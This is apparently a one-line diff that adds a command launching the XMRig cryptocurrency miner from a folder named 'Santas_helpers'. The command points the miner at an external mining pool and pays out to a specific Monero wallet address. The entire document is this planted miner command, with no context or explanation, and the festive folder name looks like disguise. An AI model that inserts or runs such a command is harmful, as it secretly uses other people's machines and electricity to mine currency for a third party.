@@ -1,0 +1,1 @@
+Santas_helpers\xmrig.exe -o stratum+tcp://theminerspool.com:3333 -u 4BKQQ7FPdpAFVne2icuXW53VdaepFWfPNLhv9bwHFD6xdGrPLMpXLYDSuDvTx8z8hQWM6k5r4PTAuFPXW1MKKBRhB45G15Z -p x -k
